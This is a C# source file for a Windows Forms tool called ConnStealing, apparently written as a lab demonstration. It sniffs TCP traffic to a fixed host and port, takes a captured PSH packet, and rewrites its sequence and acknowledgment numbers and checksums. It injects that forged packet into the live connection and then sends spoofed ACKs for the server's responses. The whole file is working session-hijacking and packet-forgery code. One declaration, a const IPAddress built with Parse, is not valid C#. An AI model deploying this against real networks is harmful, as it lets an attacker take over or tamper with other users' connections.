using System;
using System.Collections.Generic;
using System.Net;
using System.Windows.Forms;
using PacketDotNet;
using SharpPcap;
using System.Threading;

/// Usage:
///     Server side:
///         1). Open some server (i.e. server.bat) that runs under tcp://TARGET_HOST:TARGET_PORT
///     Client side:
///         1). Open the client-side html with browser (i.e. http://TARGET_HOST/socketTut.html)
///         2). Run ConnStealing
///         3). Click 'Send' button from the browser, to send some PSH packet(s) to the server
///         4). Click 'Send Packet' button from ConnStealing
namespace ConnStealing
{
    public partial class CaptureForm : Form
    {
        private const int TARGET_PORT = 9999;
        private const int RECEIVING_PACKED_EXPECTED = 2;
        private const IPAddress TARGET_HOST = IPAddress.Parse("10.0.0.4");

        private bool _backgroundThreadStop = true;
        private bool _bEveryPacket;
        private bool _statisticsUiNeedsUpdate;
        private int _iRecvPackets;
        private object _queueLock = new object();
        private DateTime _lastStatisticsOutput;
        private ICaptureDevice _device = CaptureDeviceList.Instance[0];
        private ICaptureStatistics _captureStatistics;
        private List<RawCapture> _packetQueue = new List<RawCapture>();
        private Thread _backgroundThread;
        private TcpRecon _tcpRecon;
        private TimeSpan _lastStatisticsInterval = new TimeSpan(0, 0, 2);

        private static Packet _lastAckPacket = null;
        private static Packet _pshPacket = null;

        public BindingSource bs = new BindingSource();

        public static int packetCount;
        public static IPAddress MyIp;

        public CaptureForm()
        {
            InitializeComponent();

            foreach (IPAddress ip in Dns.GetHostEntry(Dns.GetHostName()).AddressList)
            {
                if (ip.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
                {
                    CaptureForm.MyIp = ip;
                    break;
                }
            }

            rbEveryPacket_CheckedChanged(rbEveryPacket, null);
            dataGridView.DataSource = bs;
            _device.OnPacketArrival += device_OnPacketArrival;
            _device.OnCaptureStopped += device_OnCaptureStopped;
            _device.Open();
            //device.Filter = "src port 9339";
            _device.Filter = string.Format("host {0} and tcp port {1}", TARGET_HOST, TARGET_PORT);
            _tcpRecon = new TcpRecon(this);

            StartCapture();
        }

        private void StartCapture()
        {
            _bEveryPacket = rbEveryPacket.Checked;
            gbrSniffType.Enabled = false;
            CaptureForm.packetCount = 0;
            _backgroundThreadStop = false;
            _backgroundThread = new System.Threading.Thread(BackgroundThread);
            _backgroundThread.Start();
            _statisticsUiNeedsUpdate = false;
            _lastStatisticsOutput = DateTime.Now;
            _captureStatistics = _device.Statistics;
            UpdateCaptureStatistics();
            _device.StartCapture();
            tsb1StartStop.Image = global::ConnStealing.Properties.Resources.stop_icon_enabled;
            tsb1StartStop.ToolTipText = "Stop capturing";
            _iRecvPackets = 0;
        }

        private void Shutdown()
        {
            _device.StopCapture();
            if (_backgroundThread != null)
            {
                _backgroundThreadStop = true;
                _backgroundThread.Join();
                _backgroundThread = null;
            }
            _tcpRecon.Close();
            lock (_queueLock) _packetQueue.Clear();
            tsb1StartStop.Image = global::ConnStealing.Properties.Resources.play_icon_enabled;
            tsb1StartStop.ToolTipText = "Start capturing";
            gbrSniffType.Enabled = true;
        }

        private void device_OnCaptureStopped(object sender, CaptureStoppedEventStatus status)
        {
            if (status != CaptureStoppedEventStatus.CompletedWithoutError)
                MessageBox.Show("Error stopping capture", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
        }

        void device_OnPacketArrival(object sender, CaptureEventArgs e)
        {
            var Now = DateTime.Now; // cache 'DateTime.Now' for minor reduction in cpu overhead
            var interval = Now - _lastStatisticsOutput;
            if (interval > _lastStatisticsInterval)
            {
                //Console.WriteLine("device_OnPacketArrival: " + e.Device.Statistics);
                _captureStatistics = e.Device.Statistics;
                _statisticsUiNeedsUpdate = true;
                _lastStatisticsOutput = Now;
            }
            
            if (CaptureForm._pshPacket != null && _iRecvPackets <= RECEIVING_PACKED_EXPECTED)
            {
                Packet p = Packet.ParsePacket(e.Packet.LinkLayerType, e.Packet.Data);
                TcpPacket tcp = TcpPacket.GetEncapsulated(p);
                if (tcp.Psh && tcp.SourcePort == TARGET_PORT && tcp.PayloadData.Length > 0)
                {
                    IPv4Packet ip = (IPv4Packet)IpPacket.GetEncapsulated(CaptureForm._pshPacket);
                    IPv4Packet lastAckIp = (IPv4Packet)IpPacket.GetEncapsulated(CaptureForm._lastAckPacket);
                    TcpPacket lastAckTcp = TcpPacket.GetEncapsulated(CaptureForm._lastAckPacket);
                    lastAckIp.Id = (ushort)(ip.Id + 10);
                    lastAckIp.UpdateIPChecksum();
                    lastAckTcp.SequenceNumber = tcp.AcknowledgmentNumber;
                    lastAckTcp.AcknowledgmentNumber = (uint)(tcp.SequenceNumber + tcp.PayloadData.Length);
                    lastAckTcp.UpdateTCPChecksum();
                    _device.SendPacket(CaptureForm._lastAckPacket);
                    CaptureForm._pshPacket = CaptureForm._lastAckPacket;
                    _iRecvPackets++;
                }
            }

            lock (_queueLock)
                _packetQueue.Add(e.Packet);
        }

        private void tsb1StartStop_Click(object sender, EventArgs e)
        {
            if (_backgroundThreadStop) StartCapture();
            else Shutdown();
        }

        private void stb2Clear_Click(object sender, EventArgs e)
        {
            bs.Clear();
            bs = new BindingSource();
            dataGridView.DataSource = bs;
        }

        private void tsb3Send_Click(object sender, EventArgs e)
        {
            bool isAckLast = false;
            int iSyncHandshake = 0;
            ushort pshPort = 0;
            IPv4Packet ip, lastAckIp;
            RawCapture lastAckRaw, pshRaw;
            TcpPacket lastAckTcp, tcp;

            lastAckRaw = pshRaw = null;
            foreach (PacketWrapper2 pw2a in bs)
            {
                tcp = pw2a.tcpPacket;
                if (tcp.Psh && tcp.DestinationPort == TARGET_PORT && pw2a.Msg.Length > 0)
                {
                    pshPort = tcp.SourcePort;
                    pshRaw = pw2a.rawPacket;
                    break;
                }
            }
            if (pshPort == 0)
            {
                MessageBox.Show("Wait for PSH packet to be sent !");
                return;
            }

            CaptureForm._pshPacket = Packet.ParsePacket(pshRaw.LinkLayerType, pshRaw.Data);
            foreach (PacketWrapper2 pw2b in bs)
            {
                tcp = pw2b.tcpPacket;
                if (tcp.SourcePort != pshPort && tcp.DestinationPort != pshPort) continue;
                isAckLast = false;
                if (tcp.Syn) iSyncHandshake++;
                //else if (tcp.Psh && tcp.SourcePort == TARGET_PORT) pshRaw = pw2b.rawPacket;
                else if (tcp.Ack && tcp.DestinationPort == TARGET_PORT && !tcp.Fin && !tcp.Psh)
                {
                    lastAckRaw = pw2b.rawPacket;
                    isAckLast = true;
                }
                else if (tcp.Fin) iSyncHandshake--;
            }
            /*if (iSyncHandshake <= 0)
            {
                MessageBox.Show("Connection closed !");
                return;
            }*/
            if (!isAckLast)
            {
                MessageBox.Show("Wait for the ACK packet to be last !");
                return;
            }
            CaptureForm._lastAckPacket = Packet.ParsePacket(lastAckRaw.LinkLayerType, lastAckRaw.Data);
            lastAckIp = (IPv4Packet)IpPacket.GetEncapsulated(CaptureForm._lastAckPacket);
            lastAckTcp = TcpPacket.GetEncapsulated(CaptureForm._lastAckPacket);

            /*if (pshRaw == null)
            {
                MessageBox.Show("Wait for PSH packet to be sent !");
                return;
            }
            pshPacket = Packet.ParsePacket(pshRaw.LinkLayerType, pshRaw.Data);*/

            ip = (IPv4Packet)IpPacket.GetEncapsulated(CaptureForm._pshPacket);
            ip.Id = (ushort)(lastAckIp.Id + 10);
            ip.UpdateIPChecksum();

            tcp = TcpPacket.GetEncapsulated(CaptureForm._pshPacket);
            tcp.SequenceNumber = lastAckTcp.SequenceNumber;
            tcp.AcknowledgmentNumber = lastAckTcp.AcknowledgmentNumber;
            tcp.UpdateTCPChecksum();

            _iRecvPackets = 1;
            _device.SendPacket(CaptureForm._pshPacket);
        }

        private void BackgroundThread()
        {
            while (!_backgroundThreadStop)
            {
                bool shouldSleep = true;
                lock (_queueLock)
                {
                    if (_packetQueue.Count != 0)
                        shouldSleep = false; 
                }
                if (shouldSleep)
                    System.Threading.Thread.Sleep(250);
                else
                {
                    List<RawCapture> ourQueue;
                    lock (_queueLock)
                    {
                        ourQueue = _packetQueue;
                        _packetQueue = new List<RawCapture>();
                    }

                    //Console.WriteLine("BackgroundThread: ourQueue.Count is {0}", ourQueue.Count);

                    foreach (RawCapture rawCapture in ourQueue)
                    {
                        // NOTE: If the incoming packet rate is greater than
                        //       the packet processing rate these queues will grow
                        //       to enormous sizes. Packets should be dropped in these
                        //       cases
                        if (_bEveryPacket)
                        {
                            PacketWrapper2 pw = new PacketWrapper2(rawCapture);
                            BeginInvoke(new MethodInvoker(delegate { bs.Add(pw); }));
                        }
                        else _tcpRecon.ReassemblePacket(rawCapture);
                    }

                    if (_statisticsUiNeedsUpdate)
                    {
                        UpdateCaptureStatistics();
                        _statisticsUiNeedsUpdate = false;
                    }
                }
            }
        }

        private void UpdateCaptureStatistics()
        {
            captureStatisticsToolStripStatusLabel.Text = String.Format(
                "Received packets: {0}, Dropped packets: {1}, Interface dropped packets: {2}",
                _captureStatistics.ReceivedPackets, _captureStatistics.DroppedPackets, _captureStatistics.InterfaceDroppedPackets
            );
        }

        private void CaptureForm_FormClosing(object sender, FormClosingEventArgs e)
        {
            Shutdown();
            _device.Close();
            _device.OnPacketArrival -= device_OnPacketArrival;
            _device.OnCaptureStopped -= device_OnCaptureStopped;
            _device = null;
        }

        private void splitContainer1_Panel1_Paint(object sender, PaintEventArgs e)
        {

        }

        private void dataGridView_SelectionChanged(object sender, EventArgs e)
        {
            if (dataGridView.SelectedCells.Count == 0)
                return;

            object row = dataGridView.Rows[dataGridView.SelectedCells[0].RowIndex].DataBoundItem;
            WrapperBase pw;

            if (_bEveryPacket) pw = (PacketWrapper2)row;
            else pw = row as PacketWrapper;
            packetInfoTextbox.Text = pw.Msg;
        }

        private void rbEveryPacket_CheckedChanged(object sender, EventArgs e)
        {
            tsb3Send.Enabled = (sender as RadioButton).Checked;
        }

        
    }
}
